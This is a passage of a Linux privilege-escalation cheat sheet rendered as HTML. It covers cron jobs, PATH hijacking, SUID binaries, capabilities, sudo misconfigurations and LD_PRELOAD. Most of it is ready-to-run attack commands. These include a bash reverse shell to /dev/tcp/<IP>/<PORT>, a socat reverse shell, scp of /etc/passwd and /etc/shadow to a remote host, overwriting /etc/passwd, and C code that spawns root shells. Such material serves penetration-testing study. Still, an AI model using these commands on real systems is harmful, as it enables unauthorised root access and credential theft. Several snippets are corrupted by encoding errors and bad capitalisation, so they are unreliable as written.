cat /etc/cron.deny*
</code></pre></div><p>You can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to detect a CRON job.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
./pspy64 -pf -i 1000 
</code></pre></div><p>####Cron job Bash exploit
Overwrite the Bash script with the following if you have write permissions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash		
</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;<span style="color:#ae81ff">1</span>  <span style="color:#75715e"># amend &lt;IP&gt; and &lt;PORT&gt;</span>
</code></pre></div><p>Setup a Netcat listener and wait for the cron job to execute the script.</p>
<p>####Cron job PATH environment variable exploit
Run lse.sh and check for â€œCan we write to any paths present in cron jobsâ€.
Create the following script matching the name of the cron job in /tmp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
</code></pre></div><p>Make sure the script is executable:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x &lt;CRON-SCRIPT&gt;.sh
</code></pre></div><p>Wait for the cron job to run and then execute the newly created SUID script in /tmp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/tmp/rootbash
</code></pre></div><p>You will now have a root shell.</p>
<p>Refer: 
<a href="https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/">linux-privilege-escalation-by-exploiting-cron-jobs</a>
<a href="https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/">https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/</a></p>
<h2 id="systemd-timers">Systemd timers</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02<span style="color:#960050;background-color:#1e0010">:</span>59<span style="color:#960050;background-color:#1e0010">:</span>14 CEST  15h left Sun 2019-03-31 10<span style="color:#960050;background-color:#1e0010">:</span>52<span style="color:#960050;background-color:#1e0010">:</span>49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06<span style="color:#960050;background-color:#1e0010">:</span>20<span style="color:#960050;background-color:#1e0010">:</span>40 CEST  19h left Sun 2019-03-31 10<span style="color:#960050;background-color:#1e0010">:</span>52<span style="color:#960050;background-color:#1e0010">:</span>49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07<span style="color:#960050;background-color:#1e0010">:</span>36<span style="color:#960050;background-color:#1e0010">:</span>10 CEST  20h left Sat 2019-03-09 14<span style="color:#960050;background-color:#1e0010">:</span>28<span style="color:#960050;background-color:#1e0010">:</span>25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
</code></pre></div><h2 id="path-variables">PATH Variables</h2>
<p>First, search for the file having SUID or 4000 permission with help of Find command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
<span style="color:#75715e">#home/quac/script/shell</span>
</code></pre></div><h3 id="if-executing-ps-in-the-shell-example">If executing <code>ps</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ps&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:
<code>Method 1:</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; ps
$chmod <span style="color:#ae81ff">777</span> ps
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/raj/script
$./shell
$whoami
<span style="color:#75715e">#root</span>
</code></pre></div><p><code>Method 2:</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /home/quac/script/
cp /bin/sh /tmp/ps
echo $PATH
export PATH<span style="color:#f92672">=</span>/tmp:$PATH
./shell
whoami
</code></pre></div><h3 id="if-executing-id-in-the-shell-example">If executing <code>id</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$echo <span style="color:#e6db74">&#34;/bin/bash&#34;</span> &gt; id
$chmod <span style="color:#ae81ff">777</span> id
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
</code></pre></div><h3 id="if-executing-cat-in-the-shell-example">If executing <code>cat</code> in the shell, Example:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
void main<span style="color:#f92672">(){</span>
	setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>
</code></pre></div><p>Then:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cd /tmp
$nano cat
/bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$chmod <span style="color:#ae81ff">777</span> cat
$ls -al cat
$echo $PATH
$export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$cd /home/quac/script
$./shell
$whoami
</code></pre></div><p>Refer: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
<h2 id="suid">SUID</h2>
<h3 id="find-suid-binaries">Find SUID binaries</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -4000 -type f -exec ls -la <span style="color:#f92672">{}</span> 2&gt;/dev/null <span style="color:#ae81ff">\;</span>
find / -uid <span style="color:#ae81ff">0</span> -perm -4000 -type f 2&gt;/dev/null
</code></pre></div><h3 id="exploitation-suid">Exploitation SUID</h3>
<p>Cp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cp /etc/passwd /var/www/html
<span style="color:#75715e">#Change pass or add new user to /var/www/html</span>
<span style="color:#75715e">#(python3 -&gt; import crypt -&gt; crypt.crypt(â€˜newpassâ€™))</span>
$python -m http.server <span style="color:#ae81ff">80</span>
$cd /tmp
$wget //$IP/passwd
$cp passwd /etc/passwd
</code></pre></div><p>Nmap</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap --interactive
nmap&gt; !sh
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#Another way below (if nmap doesnâ€™t have interactive mode):</span>
$ echo â€œos.execute<span style="color:#f92672">(</span>â€˜/bin/shâ€™<span style="color:#f92672">)</span>â€ &gt; /tmp/shell.nse
$ sudo nmap --script<span style="color:#f92672">=</span>/tmp/shell.nse
</code></pre></div><p>Vi</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ vi
:!sh
</code></pre></div><p>Find</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find / home -exec sh -i <span style="color:#ae81ff">\;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#Or exec any command:</span>
$touch file
$find file -exec <span style="color:#e6db74">&#34;whoami&#34;</span> <span style="color:#ae81ff">\;</span>
</code></pre></div><p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c â€˜import pty;pty.spawn<span style="color:#f92672">(</span>â€œ/bin/shâ€<span style="color:#f92672">)</span>â€™
</code></pre></div><p>Strace</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strace -o /dev/null /bin/sh
</code></pre></div><p>Tcpdump</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo $â€™id<span style="color:#ae81ff">\n</span>cat /etc/shadowâ€™ &gt; /tmp/.shell
$ chmod +x /tmp/.shell
$ tcpdump -ln -i eth0 -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z /tmp/.shell -Z root
</code></pre></div><h3 id="create-a-suid-binary">Create a SUID binary</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$print <span style="color:#e6db74">&#39;int main(void){\nsetresuid(0, 0, 0);\nsystem(&#34;/bin/sh&#34;);\n}&#39;</span> &gt; /tmp/suid.c   
$gcc -o /tmp/suid /tmp/suid.c  
$sudo chmod +x /tmp/suid <span style="color:#75715e"># execute right</span>
$sudo chmod +s /tmp/suid <span style="color:#75715e"># setuid bit</span>
</code></pre></div><h2 id="capabilities">Capabilities</h2>
<h3 id="list-capabilities-of-binaries">List capabilities of binaries</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">getcap -r / 2&gt;/dev/null
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                <span style="color:#f92672">=</span> cap_net_raw+ep
/usr/bin/dumpcap              <span style="color:#f92672">=</span> cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon <span style="color:#f92672">=</span> cap_ipc_lock+ep
/usr/bin/rlogin               <span style="color:#f92672">=</span> cap_net_bind_service+ep
/usr/bin/ping                 <span style="color:#f92672">=</span> cap_net_raw+ep
/usr/bin/rsh                  <span style="color:#f92672">=</span> cap_net_bind_service+ep
/usr/bin/rcp                  <span style="color:#f92672">=</span> cap_net_bind_service+ep
</code></pre></div><h3 id="edit-capabilities">Edit capabilities</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">/usr/bin/setcap -r /bin/ping            <span style="color:#75715e"># remove</span>
/usr/bin/setcap cap_net_raw+p /bin/ping <span style="color:#75715e"># add</span>
</code></pre></div><h3 id="interesting-capabilities">Interesting capabilities</h3>
<p>Having the capability =ep means the binary has all the capabilities.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ getcap openssl /usr/bin/openssl 
openssl=ep
</code></pre></div><p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cap_dac_read_search <span style="color:#75715e"># read anything</span>
cap_setuid+ep <span style="color:#75715e"># setuid</span>
</code></pre></div><p>Privilege escalation with <code>cap_setuid+ep</code> and <code>python</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python3

$ ./python3 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
$ id
uid=0(root) gid=1000(swissky)
</code></pre></div><p>Privilege escalation with <code>cap_setuid+ep</code> and <code>Perl</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$./perl -e <span style="color:#e6db74">&#39;use POSIX (setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
<span style="color:#75715e">#â€¢	perl -e allows us to execute perl code.</span>
<span style="color:#75715e">#â€¢	use POSIX (setuid); imports the required module.</span>
<span style="color:#75715e">#â€¢	POSIX::setuid(0); sets the UID to 0, which is root.</span>
<span style="color:#75715e">#â€¢	exec &#34;/bin/bash&#34;; executes bash as root.</span>
</code></pre></div><p>Privilege escalation with <code>cap_dac_read_search</code> and <code>zip</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$/path/to/zip /tmp/shadow.zip /etc/shadow
<span style="color:#75715e">#/path/to/ is the directory of the zip file with the added capability.</span>
<span style="color:#75715e">#Next, we extract that archive: </span>
$unzip /tmp/shadow.zip -d /tmp
<span style="color:#75715e">#Then, we can simply read the file: </span>
$cat /tmp/etc/shadow
</code></pre></div><p>Privilege escalation with <code>tar = cap_dac_read_search+ep</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$tar -cvf shadow.tar /etc/shadow
$tar -xvf shadow.tar
$cat /etc/shadow
</code></pre></div><table>
<thead>
<tr>
<th>Capabilities name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CAP_AUDIT_CONTROL</td>
<td>Allow to enable/disable kernel auditing</td>
</tr>
<tr>
<td>CAP_AUDIT_WRITE</td>
<td>Helps to write records to kernel auditing log</td>
</tr>
<tr>
<td>CAP_BLOCK_SUSPEND</td>
<td>This feature can block system suspends</td>
</tr>
<tr>
<td>CAP_CHOWN</td>
<td>Allow user to make arbitrary change to files UIDs and GIDs</td>
</tr>
<tr>
<td>CAP_DAC_OVERRIDE</td>
<td>This helps to bypass file read, write and execute permission checks</td>
</tr>
<tr>
<td>CAP_DAC_READ_SEARCH</td>
<td>This only bypass file and directory read/execute permission checks</td>
</tr>
<tr>
<td>CAP_FOWNER</td>
<td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
</tr>
<tr>
<td>CAP_KILL</td>
<td>Allow the sending of signals to processes belonging to others</td>
</tr>
<tr>
<td>CAP_SETGID</td>
<td>Allow changing of the GID</td>
</tr>
<tr>
<td>CAP_SETUID</td>
<td>Allow changing of the UID</td>
</tr>
<tr>
<td>CAP_SETPCAP</td>
<td>Helps to transferring and removal of current set to any PID</td>
</tr>
<tr>
<td>CAP_IPC_LOCK</td>
<td>This helps to lock memory</td>
</tr>
<tr>
<td>CAP_MAC_ADMIN</td>
<td>Allow MAC configuration or state changes</td>
</tr>
<tr>
<td>CAP_NET_RAW</td>
<td>Use RAW and PACKET sockets</td>
</tr>
<tr>
<td>CAP_NET_BIND_SERVICE</td>
<td>SERVICE Bind a socket to internet domain privileged ports</td>
</tr>
<tr>
<td>Reference: <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Capabilities</a></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="sudo">SUDO</h2>
<p>Tool: <a href="https://github.com/TH3xACE/SUDO_KILLER">Sudo Exploitation</a></p>
<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
View sudo rights:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
</code></pre></div><h3 id="allow-root-privilege-to-binary-commands">Allow Root Privilege to Binary commands</h3>
<p>(root) ALL: run all command as root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo su
<span style="color:#75715e">#or</span>
$sudo bash
</code></pre></div><p>Find</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo find /home -exec /bin/bash <span style="color:#ae81ff">\;</span>
$sudo find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
</code></pre></div><p>Perl</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
</code></pre></div><p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Less</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo less /etc/profile 
$!/bin/sh or !bash
</code></pre></div><p>Time</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo time /bin/bash
</code></pre></div><p>AWK</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;</span>
</code></pre></div><p>Man</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo man man
!bash
</code></pre></div><p>Vi</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo vi
:!bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo vi -c <span style="color:#e6db74">&#39;!bash&#39;</span>
</code></pre></div><p>Sed</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo sed -n â€˜le exec sh 1&gt;&amp;0â€™ /etc/passwd
</code></pre></div><p>Xxd</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$xxd <span style="color:#e6db74">&#34;/etc/shadow&#34;</span> | xxd -r
<span style="color:#75715e">#crack pass with john</span>
</code></pre></div><p>Cat:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo cat /etc/shadow -&gt; crack pass<span style="color:#f92672">(</span>john/hashcat<span style="color:#f92672">)</span>
</code></pre></div><h3 id="allow-root-privilege-to-shell-script">Allow Root Privilege to Shell Script</h3>
<p>ALL= (root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell</p>
<p>Python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!  /usr/bin/python
</span><span style="color:#75715e"></span>Import os
Os.system<span style="color:#f92672">(</span>â€œ/bin/bashâ€<span style="color:#f92672">)</span>
</code></pre></div><p>C</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include&lt;stdio.h&gt;</span>
<span style="color:#75715e">#include &lt;unistd.h&gt;</span>
<span style="color:#75715e">#include&lt;sys/types.h&gt;</span>
Int main<span style="color:#f92672">(){</span>
	Setuid<span style="color:#f92672">(</span>geteuid<span style="color:#f92672">())</span>;
	System<span style="color:#f92672">(</span>â€œ/bin/bashâ€<span style="color:#f92672">)</span>;
	Return 0;
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Gcc demo.c -o shell
./shell
</code></pre></div><p>Bash script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#! /bin/bash
</span><span style="color:#75715e"></span>/bin/bash
</code></pre></div><h3 id="allow-sudo-right-to-other-programs">Allow Sudo Right to other Programs</h3>
<p>ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat</p>
<p>Env</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo env /bin/bash
</code></pre></div><p>FTP/GDB</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$Sudo ftp
$!/bin/bash
</code></pre></div><p>Socat</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:1234 <span style="color:#f92672">(</span>attacker<span style="color:#f92672">)</span>
$sudo socat exec:<span style="color:#e6db74">&#39;sh -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:$IP:1234 <span style="color:#f92672">(</span>victim<span style="color:#f92672">)</span>
</code></pre></div><p>SCP
Syntax: scp SourceFile user@host:~/path of the directory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo scp /etc/passwd user@$IP:~/
$sudo scp /etc/shadow user@$IP:~/
</code></pre></div><p>Zip</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo zip /tmp/test.zip /tmp/test -T --unzip-command<span style="color:#f92672">=</span>â€sh -c /bin/bashâ€
</code></pre></div><p>Tar</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$sudo tar cf /dev/null testfile --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> â€” checkpointaction<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>/bin/bash
</code></pre></div><p>Strace</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo strace -o/dev/null /bin/bash
</code></pre></div><p>Tcpdump</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo $â€™id<span style="color:#ae81ff">\n</span>cat /etc/shadowâ€™ &gt; /tmp/.shell
$ chmod +x /tmp/.shell
$ sudo tcpdump -ln -i eth0 -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z /tmp/.shell -Z root
</code></pre></div><p>Nmap</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap --interactive
nmap&gt; !sh
</code></pre></div><p>Git</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo git help status
: !/bin/bash
</code></pre></div><h3 id="ld_preload">LD_PRELOAD</h3>
<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Defaults        env_keep += LD_PRELOAD
</code></pre></div><p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
<span style="color:#75715e">#include &lt;sys/types.h&gt;</span>
<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
void _init() {
	unsetenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
	setgid(0);
	setuid(0);
	system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
}
</code></pre></div><p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>
<h3 id="doas">Doas</h3>
<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">permit nopass demo as root cmd vim
</code></pre></div><h3 id="sudo_inject">sudo_inject</h3>
<p>Using <a href="https://github.com/nongiach/sudo_inject">https://github.com/nongiach/sudo_inject</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ sudo whatever
<span style="color:#66d9ef">[sudo]</span> password <span style="color:#66d9ef">for</span> user<span style="color:#960050;background-color:#1e0010">:</span>    
<span style="color:#75715e"># Press &lt;ctrl&gt;+c since you don&#39;t have the password. </span>
<span style="color:#75715e"># This creates an invalid sudo tokens.</span>
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i <span style="color:#75715e"># no password required :)</span>
<span style="color:#75715e"># id</span>
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>Slides of the presentation : <a href="https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf">https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</a></p>
<h3 id="cve-2019-14287">CVE-2019-14287</h3>
